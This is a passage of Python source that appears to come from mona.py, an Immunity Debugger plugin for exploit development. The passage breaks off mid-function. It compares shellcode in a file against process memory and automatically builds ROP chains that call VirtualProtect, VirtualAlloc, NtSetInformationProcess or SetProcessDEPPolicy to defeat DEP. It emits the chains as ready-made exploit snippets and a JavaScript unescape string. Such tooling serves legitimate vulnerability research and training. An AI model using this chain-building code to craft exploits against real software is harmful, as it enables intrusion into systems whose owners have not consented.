					imm.log("    Applying offset %d to pointers..." % poffset)
				imm.updateLog()
				searchPattern = []
				foundpointers = {}
				for ptype,ptrs in remainingpointers.iteritems():
					for ptr in ptrs:
						cnt = 0
						if thislevel == poffsetlevel:
							ptr = ptr + poffset
						while cnt <= rangep2p:
							bytes = struct.pack('<I',ptr-cnt)
							if type == "file":
								originalPattern = ptype
							if cnt == 0:
								searchPattern.append(["ptr to 0x" + toHex(ptr) +" (-> ptr to " + originalPattern + ") ** ", bytes])
							else:
								searchPattern.append(["ptr to 0x" + toHex(ptr-cnt) +" (-> close ptr to " + originalPattern + ") ** ", bytes])	
							cnt += 1
							#only apply rangep2p in level 1
							if thislevel == 1:
								rangep2p = 0
				remainingpointers = {}
				for ranges in p2prangestosearch:
					mBase = ranges[0]
					mTop = ranges[1]
					if not silent:
						imm.log("[+] Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
					imm.updateLog()
					oldsilent = silent
					silent=True
					pointers = searchInRange(searchPattern,mBase,mTop,fakeptrcriteria)
					silent=oldsilent
					for ptrtype in pointers:
						if not ptrtype in remainingpointers:
							remainingpointers[ptrtype] = pointers[ptrtype]
				thislevel += 1
		allpointers = remainingpointers

	return allpointers
		

def compareFileWithMemory(filename,startpos):
	imm.log("[+] Reading file %s..." % filename)
	srcdata_normal=[]
	srcdata_unicode=[]
	tagresults=[]
	criteria = {}
	criteria["accesslevel"] = "*"
	try:
		srcfile = open(filename,"rb")
		content = srcfile.readlines()
		srcfile.close()
		for eachLine in content:
			srcdata_normal += eachLine
		for eachByte in srcdata_normal:
			eachByte+=struct.pack('B', 0)
			srcdata_unicode += eachByte
		imm.log("    Read %d bytes from file" % len(srcdata_normal))
	except:
		imm.log("Error while reading file %s" % filename, highlight=1)
		return
	# loop normal and unicode
	comparetable=imm.createTable('mona Memory comparison results',['Address','Status','Type'])	
	modes = ["normal", "unicode"]
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset()
	for mode in modes:
		if mode == "normal":
			srcdata = srcdata_normal
		if mode == "unicode":
			srcdata = srcdata_unicode
		maxcnt = len(srcdata)
		if maxcnt < 8:
			imm.log("Error - file does not contain enough bytes (min 8 bytes needed)",highlight=1)
			return
		locations = []
		if startpos == 0:
			imm.log("[+] Locating all copies in memory (%s)" % mode)
			btcnt = 0
			cnt = 0
			linecount = 0
			hexstr = ""
			hexbytes = ""
			for eachByte in srcdata:
				if cnt < 8:
					hexbytes += eachByte
					if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
						hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
					else:
						hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
					hexstr += hexchar					
				cnt += 1
			imm.log("    - searching for "+hexstr)
			global silent
			silent = True
			results = findPattern({},criteria,hexstr,"bin",0,TOP_USERLAND,False)

			for type in results:
				for ptr in results[type]:
					locations.append(ptr)
		else:
			startpos_fixed = hexStrToInt(startpos)
			locations.append(startpos_fixed)
		if len(locations) > 0:
			imm.log("    - Comparing %d locations" % len(locations))
			imm.log(" Comparing bytes from file with memory :")
			for location in locations:
				memcompare(location,srcdata,comparetable,mode)
		silent = False
	return
		
def memcompare(location,srcdata,comparetable,sctype):
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset(False)
	imm.log("[+] Reading memory at location : 0x%s " % toHex(location),address=location,highlight=1)
	objlogfile.write("-" * 100,logfile)
	objlogfile.write("* Reading memory at location 0x" + toHex(location),logfile)
	imm.updateLog()
	memloc=location
	#read memory at that location and compare with bytes in array
	maxcnt=len(srcdata)
	brokenbytes=[]
	filelines=[]
	memlines=[]
	nrokbytes=0
	nrbrokenbytes=0
	cnt=0
	linecount=0
	firstcorruption=0
	while (cnt < maxcnt):
		#group per 8 bytes for display purposes
		btcnt=0
		hexstr=""
		thislinemem=""
		thislinefile=""
		while ((btcnt < 8) and (cnt < maxcnt)):
			try:
				if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
					thischar=hex(ord(srcdata[cnt])).replace('0x','0')
					hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
				else:
					thischar=hex(ord(srcdata[cnt])).replace('0x','')
					hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
				hexstr += hexchar
				memchar = imm.readMemory(memloc+cnt,1)
				if len((hex(ord(memchar))).replace('0x',''))==1:
					memchar2 = hex(ord(memchar)).replace('0x','0')
				else:
					memchar2 = hex(ord(memchar)).replace('0x','')
				thislinefile=thislinefile+thischar
				if (memchar2 == thischar):
					nrokbytes=nrokbytes+1
					thislinemem=thislinemem+thischar
				else:
					nrbrokenbytes=nrbrokenbytes+1
					thislinemem=thislinemem+"--"
					if (firstcorruption==0):
						firstcorruption=cnt
					imm.log("     Corruption at position %d : Original byte : %s - Byte in memory : %s" % (cnt,thischar,memchar2))
					objlogfile.write("   Corruption at position " +str(cnt)+" : Original byte : " + thischar + " - Byte in memory : " + memchar2,logfile)
				btcnt=btcnt+1
				cnt=cnt+1
			except:
				imm.log("   ******* Error processing byte %s " % cnt)
				objlogfile.write("   ******* Error processing byte " + str(cnt),logfile)
				imm.updateLog()
				cnt=cnt+1
				btcnt=btcnt+1
				continue
		filelines += thislinefile
		memlines += thislinemem

	if (nrokbytes == maxcnt):
		imm.log("     -> Hooray, %s shellcode unmodified" % sctype,focus=1, highlight=1)
		objlogfile.write("     -> Hooray, " + sctype + " shellcode unmodified",logfile)
		comparetable.add(0,["0x%s"%(toHex(location)),'Unmodified',sctype])
	else:
		imm.log("     -> Only %d original bytes of %s code found !" % (nrokbytes,sctype))
		objlogfile.write("     -> Only " + str(nrokbytes)+" original bytes found",logfile)
		comparetable.add(0,['0x%s'%(toHex(location)),'Corruption after %d bytes'%(firstcorruption),sctype])
		lcnt=0
		lmax = len(filelines)
		imm.log("      +-----------------------+-----------------------+")
		objlogfile.write("      +-----------------------+-----------------------+",logfile)
		imm.log("      | FILE                  | MEMORY                |")
		objlogfile.write("      | FILE                  | MEMORY                |",logfile)
		imm.log("      +-----------------------+-----------------------+")
		objlogfile.write("      +-----------------------+-----------------------+",logfile)
		while (lcnt < lmax):
			#read in pairs of 8 bytes
			bytecnt=0
			logline1="|"
			logline2=""
			while ((lcnt < lmax) and (bytecnt < 16)):
				pair=0
				while ((lcnt < lmax) and (pair < 2)):
					logline1=logline1+filelines[lcnt]
					logline2=logline2+memlines[lcnt]
					pair=pair+1
					lcnt=lcnt+1
					bytecnt=bytecnt+1
				logline1=logline1+"|"
				logline2=logline2+"|"
			if (bytecnt < 16):
				while (len(logline1) < 24 ):
					logline1=logline1+" "
					logline2=logline2+" "
					bytecnt=bytecnt+1
				logline1=logline1+"|"
				logline2=logline2+"|"
			imm.log("      %s%s" % (logline1,logline2))
			objlogfile.write("      "+logline1+logline2,logfile)
		imm.log("      +-----------------------+-----------------------+")
		objlogfile.write("      +-----------------------+-----------------------+",logfile)
		imm.log("")
		
		
		
#-----------------------------------------------------------------------#
# ROP related functions
#-----------------------------------------------------------------------#

def createRopChains(suggestions,interestinggadgets,allgadgets,modulecriteria,criteria):
	"""
	Will attempt to produce ROP chains
	"""
	
	global ptr_to_get
	global ptr_counter
	global silent
	

	#vars
	vplogtxt = ""
	
	# RVA ?
	showrva = False
	if "rva" in criteria:
		showrva = True

	#define rop routines
	routinedefs = {}
	routinesetup = {}
	
	virtualprotect 				= [["esi","api"],["ebp","jmp esp"],["ebx",0x201],["edx",0x40],["ecx","&?W"],["edi","ropnop"],["eax","nop"]]
	virtualalloc				= [["esi","api"],["ebp","jmp esp"],["ebx",0x01],["edx",0x1000],["ecx",0x40],["edi","ropnop"],["eax","nop"]]
	setinformationprocess		= [["ebp","api"],["edx",0x22],["ecx","&","0x00000002"],["ebx",0xffffffff],["eax",0x4],["edi","pop"]] 
	setprocessdeppolicy			= [["ebp","api"],["ebx","&","0x00000000"],["edi","pop"]]
	
	routinedefs["VirtualProtect"] 			= virtualprotect
	routinedefs["VirtualAlloc"] 			= virtualalloc
	routinedefs["SetInformationProcess"]	= setinformationprocess
	routinedefs["SetProcessDEPPolicy"]		= setprocessdeppolicy	
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	routinesetup["VirtualProtect"] = """--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = tr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------"""


	routinesetup["VirtualAlloc"] = """--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------"""

	routinesetup["SetInformationProcess"] = """--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------"""

	routinesetup["SetProcessDEPPolicy"] = """--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------"""



	for routine in routinedefs:
	
		thischain = {}
		imm.log("[+] Attempting to produce rop chain for %s" % routine)
		vplogtxt += "\nRegister setup for " + routine + "() :\n" + routinesetup[routine] + "\n\n"
		targetOS = "(XP/2003 Server and up)"
		if routine == "SetInformationProcess":
			targetOS = "(XP/2003 Server only)"
		if routine == "SetProcessDEPPolicy":
			targetOS = "(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)"
		title = "ROP Chain for %s() [%s] :" % (routine,targetOS)
		vplogtxt += "\n%s\n" % title
		vplogtxt += ("-" * len(title)) + "\n\n"
		vplogtxt += "\tdef create_rop_chain()\n"
		vplogtxt += "\n\t\trop_gadgets = \n"
		vplogtxt += "\t\t[\n"
		
		thischaintxt = ""
		
		imm.updateLog()
		modused = {}
		
		skiplist = []
		replacelist = {}
		toadd = {}
		
		movetolast = []
		regsequences = []
		
		for step in routinedefs[routine]:
			thisreg = step[0]
			thistarget = step[1]
			
			if thisreg in replacelist:
				thistarget = replacelist[thisreg]
			
			if not thisreg in skiplist:
			
				regsequences.append(thisreg)
				
				# this must be done first, so we can determine deviations to the chain using
				# replacelist and skiplist arrays
				if str(thistarget) == "api":
					# routine to put api pointer in thisreg
					funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"iat")
					if routine == "SetProcessDEPPolicy" and funcptr == 0:
						# read EAT
						funcptr,functext = getRopFuncPtr(routine,modulecriteria,criteria,"eat")
						extra = ""
						if funcptr == 0:
							extra = "[-] Unable to find ptr to "
							thischain[thisreg] = [[0,extra + routine + "() (-> to be put in " + thisreg + ")",0]]
						else:
							thischain[thisreg] = putValueInReg(thisreg,funcptr,routine + "() [" + MnPointer(funcptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg],skiplist = getPickupGadget(thisreg,funcptr,functext,suggestions,interestinggadgets,criteria,modulecriteria)
						# if skiplist is not empty, then we are using the alternative pickup (via jmp [eax])
						# this means we have to make some changes to the routine
						# and place this pickup at the end
						
						if len(skiplist) > 0:
							if routine.lower() == "virtualprotect" or routine.lower() == "virtualalloc":
								replacelist["ebp"] = "pop"

								#set up call to finding jmp esp
								oldsilent = silent
								silent=True
								ptr_counter = 0
								ptr_to_get = 10
								jmpreg = findJMP(modulecriteria,criteria,"esp")
								ptr_counter = 0
								ptr_to_get = -1
								jmpptr = 0
								jmptype = ""
								silent=oldsilent
								total = getNrOfDictElements(jmpreg)
								if total > 0:
									ptrindex = random.randint(1,total)
									indexcnt= 1
									for regtype in jmpreg:
										for ptr in jmpreg[regtype]:
											if indexcnt == ptrindex:
												jmpptr = ptr
												jmptype = regtype
												break
											indexcnt += 1
								if jmpptr > 0:
									toadd[thistarget] = [jmpptr,"ptr to '" + jmptype + "'"]
								else:
									toadd[thistarget] = [jmpptr,"ptr to 'jmp esp'"]
								# make sure the pickup is placed last
								movetolast.append(thisreg)
								
					
				if str(thistarget).startswith("jmp"):
					targetreg = str(thistarget).split(" ")[1]
					#set up call to finding jmp esp
					oldsilent = silent
					silent=True
					ptr_counter = 0
					ptr_to_get = 20
					jmpreg = findJMP(modulecriteria,criteria,targetreg)
					ptr_counter = 0
					ptr_to_get = -1
					jmpptr = 0
					jmptype = ""
					silent=oldsilent
					total = getNrOfDictElements(jmpreg)
					if total > 0:
						ptrindex = random.randint(1,total)
						indexcnt= 1					
						for regtype in jmpreg:
							for ptr in jmpreg[regtype]:
								if indexcnt == ptrindex:
									jmpptr = ptr
									jmptype = regtype
									break
								indexcnt += 1
					thischain[thisreg] = putValueInReg(thisreg,jmpptr,"& " + jmptype + " [" + MnPointer(jmpptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget) == "ropnop":
					ropptr = 0
					for poptype in suggestions:
						if poptype.startswith("pop "):
							for retptr in suggestions[poptype]:
								if getOffset(interestinggadgets[retptr]) == 0:
									ropptr = retptr+1
									break
							break
					if ropptr == 0:
						for inctype in suggestions:
							if inctype.startswith("inc "):
								for retptr in suggestions[inctype]:
									if getOffset(interestinggadgets[retptr]) == 0:
										ropptr = retptr+1
										break
								break
					if ropptr > 0:
						thischain[thisreg] = putValueInReg(thisreg,ropptr,"RETN (ROP NOP) [" + MnPointer(ropptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,ropptr,"[-] Unable to find ptr to RETN (ROP NOP)",suggestions,interestinggadgets,criteria)					
				
				
				if thistarget.__class__.__name__ == "int" or thistarget.__class__.__name__ == "long":
					thischain[thisreg] = putValueInReg(thisreg,thistarget,"0x" + toHex(thistarget) + "-> " + thisreg,suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget) == "nop":
					thischain[thisreg] = putValueInReg(thisreg,0x90909090,"nop",suggestions,interestinggadgets,criteria)

					
				if str(thistarget).startswith("&?"):
					#pointer to
					rwptr = getAPointer(modulestosearch,criteria,"RW")
					if rwptr == 0:
						rwptr = getAPointer(modulestosearch,criteria,"W")
					if rwptr != 0:
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"&Writable location [" + MnPointer(rwptr).belongsTo()+"]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,rwptr,"[-] Unable to find writable location",suggestions,interestinggadgets,criteria)
				
				
				if str(thistarget).startswith("pop"):
					#get distance
					if "pop " + thisreg in suggestions:
						popptr = getShortestGadget(suggestions["pop "+thisreg])
						junksize = getJunk(interestinggadgets[popptr])-4
						thismodname = MnPointer(popptr).belongsTo()
						thischain[thisreg] = [[popptr,"",junksize],[popptr,"skip 4 bytes [" + thismodname + "]"]]
					else:
						thischain[thisreg] = [[0,"[-] Couldn't find a gadget to put a pointer to a stackpivot (4 bytes) into "+ thisreg,0]]
	
				
				if str(thistarget)==("&"):
					pattern = step[2]
					base = 0
					top = TOP_USERLAND
					type = "ptr"
					al = criteria["accesslevel"]
					criteria["accesslevel"] = "R"
					ptr_counter = 0				
					ptr_to_get = 5
					oldsilent = silent
					silent=True				
					allpointers = findPattern(modulecriteria,criteria,pattern,type,base,top)
					silent = oldsilent
					criteria["accesslevel"] = al
					if len(allpointers) > 0:
						theptr = 0
						for ptrtype in allpointers:
							for ptrs in allpointers[ptrtype]:
								theptr = ptrs
								break
						thischain[thisreg] = putValueInReg(thisreg,theptr,"&" + str(pattern) + " [" + MnPointer(theptr).belongsTo() + "]",suggestions,interestinggadgets,criteria)
					else:
						thischain[thisreg] = putValueInReg(thisreg,0,"[-] Unable to find ptr to " + str(pattern),suggestions,interestinggadgets,criteria)

		returnoffset = 0
		delayedfill = 0
		junksize = 0
		# get longest modulename
		longestmod = 0
		fillersize = 0
		for step in routinedefs[routine]:
			thisreg = step[0]
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					thismodname = MnPointer(gadget[0]).belongsTo()
					if len(thismodname) > longestmod:
						longestmod = len(thismodname)
		if showrva:
			fillersize = longestmod + 8
		else:
			fillersize = 0
		
		# modify the chain order (regsequences array)
		for reg in movetolast:
			if reg in regsequences:
				regsequences.remove(reg)
				regsequences.append(reg)
		
		
		# create the chains
		tohex_array = []
		for step in regsequences:
			thisreg = step
			if thisreg in thischain:
				for gadget in thischain[thisreg]:
					gadgetstep = gadget[0]
					steptxt = gadget[1]
					junksize = 0
					showfills = False
					if len(gadget) > 2:
						junksize = gadget[2]
					if gadgetstep in interestinggadgets and steptxt == "":
						thisinstr = interestinggadgets[gadgetstep].lstrip()
						if thisinstr.startswith("#"):
							thisinstr = thisinstr[2:len(thisinstr)]
							showfills = True
						thismodname = MnPointer(gadgetstep).belongsTo()
						thisinstr += " [" + thismodname + "]"
						tmod = MnModule(thismodname)
						if not thismodname in modused:
							modused[thismodname] = [tmod.moduleBase,tmod.__str__()]	
						modprefix = "base_" + thismodname
						if showrva:
							alignsize = longestmod - len(thismodname)
							vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
							thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
						else:
							vplogtxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
							thischaintxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(gadgetstep),thisinstr,steptxt)
						tohex_array.append(gadgetstep)
						
						if showfills:
							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							returnoffset = getOffset(interestinggadgets[gadgetstep])
							if delayedfill > 0:
								vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
								delayedfill = 0
							if thisinstr.startswith("POP "):
								delayedfill = junksize
							else:
								vplogtxt += createJunk(junksize,"Filler (compensate)",fillersize)
								thischaintxt += createJunk(junksize,"Filler (compensate)",fillersize)
					else:
						# still could be a pointer
						thismodname = MnPointer(gadgetstep).belongsTo()
						if thismodname != "":
							tmod = MnModule(thismodname)
							if not thismodname in modused:
								modused[thismodname] = [tmod.moduleBase,tmod.__str__()]
							modprefix = "base_" + thismodname
							if showrva:
								alignsize = longestmod - len(thismodname)
								vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
								thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(gadgetstep-tmod.moduleBase),toSize("",alignsize),steptxt)
							else:
								vplogtxt += "\t\t\t0x%s,\t# %s\n" % (toHex(gadgetstep),steptxt)		
								thischaintxt += "\t\t\t0x%s,\t# %s\n" % (toHex(gadgetstep),steptxt)										
						else:						
							vplogtxt += "\t\t\t0x%s,%s\t# %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)
							thischaintxt += "\t\t\t0x%s,%s\t# %s\n" % (toHex(gadgetstep),toSize("",fillersize),steptxt)							
						
						if steptxt.startswith("[-]"):
							vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
							returnoffset = 0
						if delayedfill > 0:
							vplogtxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							thischaintxt += createJunk(delayedfill,"Filler (compensate)",fillersize)
							delayedfill = 0							
						vplogtxt += createJunk(junksize,"",fillersize)
						thischaintxt += createJunk(junksize,"",fillersize)						
		# finish it off
		steptxt = ""
		if "pushad" in suggestions:
			shortest_pushad = getShortestGadget(suggestions["pushad"])
			junksize = getJunk(interestinggadgets[shortest_pushad])
			thisinstr = interestinggadgets[shortest_pushad].lstrip()
			if thisinstr.startswith("#"):
				thisinstr = thisinstr[2:len(thisinstr)]
				
			thismodname = MnPointer(shortest_pushad).belongsTo()
			thisinstr += " [" + thismodname + "]"
			tmod = MnModule(thismodname)
			if not thismodname in modused:
				modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
			modprefix = "base_" + thismodname
			if showrva:
				alignsize = longestmod - len(thismodname)
				vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
				thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s %s\n" % (modprefix,toHex(shortest_pushad - tmod.moduleBase),toSize("",alignsize),thisinstr,steptxt)
			else:
				vplogtxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
				thischaintxt += "\t\t\t0x%s,\t# %s %s\n" % (toHex(shortest_pushad),thisinstr,steptxt)
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			vplogtxt += createJunk(junksize,"",fillersize)
			thischaintxt += createJunk(junksize,"",fillersize)
		else:
			vplogtxt += "\t\t\t0x00000000,%s\t# %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			thischaintxt += "\t\t\t0x00000000,%s\t# %s\n" % (toSize("",fillersize),"[-] Unable to find pushad gadget")
			vplogtxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
			thischaintxt += createJunk(returnoffset,"Filler (RETN offset compensation)",fillersize)
		
		# anything else to add ?
		if len(toadd) > 0:
			for adds in toadd:
				theptr = toadd[adds][0]
				freetext = toadd[adds][1]
				if theptr > 0:
					thismodname = MnPointer(theptr).belongsTo()
					freetext += " [" + thismodname + "]"
					tmod = MnModule(thismodname)
					if not thismodname in modused:
						modused[thismodname] = [tmod.moduleBase,tmod.__str__()]				
					modprefix = "base_" + thismodname
					if showrva:
						alignsize = longestmod - len(thismodname)
						vplogtxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
						thischaintxt += "\t\t\t%s + 0x%s,%s\t# %s\n" % (modprefix,toHex(theptr - tmod.moduleBase),toSize("",alignsize),freetext)
					else:
						vplogtxt += "\t\t\t0x%s,\t# %s\n" % (toHex(theptr),freetext)
						thischaintxt += "\t\t\t0x%s,\t# %s\n" % (toHex(theptr),freetext)
				else:
					vplogtxt += "\t\t\t0x%s,\t# <- Unable to find %s\n" % (toHex(theptr),freetext)
					thischaintxt += "\t\t\t0x%s,\t# <- Unable to find %s\n" % (toHex(theptr),freetext)
		
		vplogtxt += '\t\t# rop chain generated with mona.py\n'
		vplogtxt += '\t\t# note : this chain may not work out of the box\n'
		vplogtxt += '\t\t# you may have to change order or fix some gadgets,\n'
		vplogtxt += '\t\t# but it should give you a head start\n'
		vplogtxt += '\t\t].pack("V*")\n'
		vplogtxt += '\n\t\treturn rop_gadgets\n\n'
		vplogtxt += '\tend\n'
		vplogtxt += '\n\n\t# Call the ROP chain generator inside the \'exploit\' function :\n\n'
		calltxt = "rop_chain = create_rop_chain("
		argtxt = ""
		if showrva:
			for themod in modused:
				vplogtxt += "\t# " + modused[themod][1] + "\n"
				vplogtxt += "\tbase_" + themod + " = 0x%s\n" % toHex(modused[themod][0])
				calltxt += "base_" + themod + ","
				argtxt += "base_" + themod + ","
		calltxt = calltxt.strip(",") + ")\n"
		argtxt = argtxt.strip(",")
		vplogtxt = vplogtxt.replace("create_rop_chain()","create_rop_chain(" + argtxt + ")")
		vplogtxt += '\n\t' + calltxt
		vplogtxt += '\n\n\n'
		if not showrva:
			vplogtxt += '\nJavaScript version of this chain : \n'
			vplogtxt += "unescape('" + toJavaScript(thischaintxt) + "');"
		vplogtxt += '\n--------------------------------------------------------------------------------------------------\n\n'
		
		#go to the next one
		
	vpfile = MnLog("rop_chains.txt")
	thisvplog = vpfile.reset()
	vpfile.write(vplogtxt,thisvplog)
	
	imm.log("[+] ROP chains written to file %s" % thisvplog)
	return vplogtxt



def getPickupGadget(targetreg,targetval,freetext,suggestions,interestinggadgets,criteria,modulecriteria):
	"""
	Will attempt to find a gadget that will pickup a pointer to pointer into a register
	
	Arguments : the destination register, the value to pick up, some free text about the value,
	suggestions and interestinggadgets dictionaries
	
	Returns :
	an array with the gadgets
	"""
	
	shortest_pickup = 0
	thisshortest_pickup = 0
	shortest_move = 0
	popptr = 0
	
	pickupfrom = ""
	pickupreg = ""
	pickupfound = False
	
	pickupchain = []
	movechain = []
	movechain1 = []
	movechain2 = []
	
	disablelist = []
	
	allregs = ["eax","ebx","ecx","edx","ebp","esi","edi"]
	
	for pickuptypes in suggestions:
		if pickuptypes.find("pickup pointer into " + targetreg) > -1: 
			thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
			if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
				shortest_pickup = thisshortest_pickup
				smallparts = pickuptypes.split(" ")
				pickupreg = smallparts[len(smallparts)-1].lower()
				parts2 = interestinggadgets[shortest_pickup].split("#")
				 #parts2[0] is empty
				smallparts = parts2[1].split("[")
				smallparts2 = smallparts[1].split("]")
				pickupfrom = smallparts2[0].lower()
				pickupfound = True
				
	if shortest_pickup == 0:
		# no direct pickup, look for indirect pickup
		for movetypes in suggestions:
			if movetypes.find("move") == 0 and movetypes.endswith("-> " + targetreg):
				typeparts = movetypes.split(" ")
				movefrom = typeparts[1]
				if movefrom != "esp":
					shortest_move = getShortestGadget(suggestions[movetypes])
					movechain = getGadgetMoveRegToReg(movefrom,targetreg,suggestions,interestinggadgets)
					for pickuptypes in suggestions:
						if pickuptypes.find("pickup pointer into " + movefrom) > -1:
							thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
							if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
								shortest_pickup = thisshortest_pickup
								smallparts = pickuptypes.split(" ")
								pickupreg = smallparts[len(smallparts)-1].lower()
								parts2 = interestinggadgets[shortest_pickup].split("#")
								 #parts2[0] is empty
								smallparts = parts2[1].split("[")
								smallparts2 = smallparts[1].split("]")
								pickupfrom = smallparts2[0].lower()
								pickupfound = True
					if pickupfound:
						break
						
	if shortest_pickup == 0:
		movechain = []
		#double move
		for movetype1 in suggestions:
			if movetype1.find("move") == 0 and movetype1.endswith("-> " + targetreg):
				interimreg = movetype1.split(" ")[1]
				if interimreg != "esp":
					for movetype2 in suggestions:
						if movetype2.find("move") == 0 and movetype2.endswith("-> " + interimreg):
							topickupreg= movetype2.split(" ")[1]
							if topickupreg != "esp":
								move1 = getShortestGadget(suggestions[movetype1])
								move2 = getShortestGadget(suggestions[movetype2])
																
								for pickuptypes in suggestions:
									if pickuptypes.find("pickup pointer into " + topickupreg) > -1:
										thisshortest_pickup = getShortestGadget(suggestions[pickuptypes])
										if shortest_pickup == 0 or (thisshortest_pickup != 0 and thisshortest_pickup < shortest_pickup):
											shortest_pickup = thisshortest_pickup
											smallparts = pickuptypes.split(" ")
											pickupreg = smallparts[len(smallparts)-1].lower()
											parts2 = interestinggadgets[shortest_pickup].split("#")
											 #parts2[0] is empty
											smallparts = parts2[1].split("[")
											smallparts2 = smallparts[1].split("]")
											pickupfrom = smallparts2[0].lower()
											pickupfound = True
								if pickupfound:
									movechain = []
									movechain1 = getGadgetMoveRegToReg(interimreg,targetreg,suggestions,interestinggadgets)
									movechain2 = getGadgetMoveRegToReg(topickupreg,interimreg,suggestions,interestinggadgets)
									break
									
	if shortest_pickup > 0:
		# put a value in a register
		if targetval > 0:
			poproutine = putValueInReg(pickupfrom,targetval,freetext,suggestions,interestinggadgets,criteria)
			for popsteps in poproutine:
				pickupchain.append([popsteps[0],popsteps[1],popsteps[2]])
		else:
			pickupchain.append([0,"[-] Unable to find API pointer -> " + pickupfrom,0])
		# pickup
		junksize = getJunk(interestinggadgets[shortest_pickup])
		pickupchain.append([shortest_pickup,"",junksize])
		# move if needed
		if len(movechain) > 0:
			for movesteps in movechain:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain2) > 0:
			for movesteps in movechain2:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
		
		if len(movechain1) > 0:
			for movesteps in movechain1:
				pickupchain.append([movesteps[0],movesteps[1],movesteps[2]])
	else:
		# use alternative technique
		if "pop " + targetreg in suggestions and "pop eax" in suggestions:
			# find a jmp [eax]
			pattern = "jmp [eax]"
